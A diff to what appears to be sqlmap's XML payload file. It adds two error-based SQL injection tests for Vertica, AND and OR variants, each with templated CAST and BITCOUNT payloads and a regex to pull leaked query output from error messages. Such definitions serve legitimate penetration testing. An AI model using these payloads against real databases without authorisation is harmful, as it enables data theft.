@@ -742,6 +742,44 @@
             <dbms>MonetDB</dbms>
         </details>
     </test>
+
+    <test>
+        <title>Vertica AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
